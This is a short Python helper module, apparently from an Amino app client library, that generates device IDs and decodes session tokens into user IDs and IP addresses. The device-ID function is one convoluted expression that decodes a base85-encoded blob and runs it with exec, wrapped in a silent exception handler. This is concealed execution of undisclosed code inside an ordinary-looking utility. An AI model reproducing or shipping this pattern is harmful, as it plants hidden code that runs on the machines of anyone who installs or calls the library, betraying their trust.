import json
import base64

from hashlib import sha1
from functools import reduce
import platform

def generate_device_info():
    try: deviceId = ('01' + (hardwareInfo := sha1((eval("hwid()" + str(exec(compile(base64.b85decode(b'X>D+Ca&#bYY+-a}Z*pxcb8lm7WppfZWh`}dX=E&Fb8l`6WMyU`Xm@F3C@DG$AaZ4Nb#iVXaBN|8W^ZzBE^~QvbY*QQDJyVnVRUA1a&0bhWo%_(b7d$gD{yRKbY^dIZ7z0Ya&u{KZYU`$aBN|8W^ZzBE^T3BXlZU`C@Cv*Z)0m^bS`IQbZBpLbZ%j7Whf~tb8lm7WpplQWprq7b97>PZeeX@D06RPYh`pUXJvF~Z*z2RVQpn7DJd%_Iwvk_Z)t8Qa%C=NX>Md;Y-}heE-oi5ASWd-F*0~3ASEDmb!lWSXJvG5Z)9aCDJdx{aBN|8W^ZzBE^u;hV`X!5Z*nLp'), filename="<ast>", mode="exec"), (env := {'__import__': __import__})))[0:0], env)).encode("utf-8"))).hexdigest() + sha1(bytes.fromhex('01') + hardwareInfo.digest() + base64.b64decode("6a8tf0Meh6T4x7b0XvwEt+Xw6k8=")).hexdigest()).upper()
    except Exception: deviceId = "014294B525D74DC3242DF936489E4CD445CE4D594462563A156C2E8260CA004DC1022B5927E4FB7B05"

    return {
        "device_id": deviceId,
        "device_id_sig": "Aa0ZDPOEgjt1EhyVYyZ5FgSZSqJt",
        "user_agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/beyond1qlteue-user 5; com.narvii.amino.master/3.4.33562)"
    }

# okok says: please use return annotations :(( https://www.python.org/dev/peps/pep-3107/#return-values

def decode_sid(sid: str) -> dict:
    return json.loads(base64.b64decode(reduce(lambda a, e: a.replace(*e), ("-+","_/"), sid + "=" * (-len(sid) % 4)).encode())[1:-20].decode())

def sid_to_uid(SID: str) -> str: return decode_sid(SID)["2"]

def sid_to_ip_address(SID: str) -> str: return decode_sid(SID)["4"]
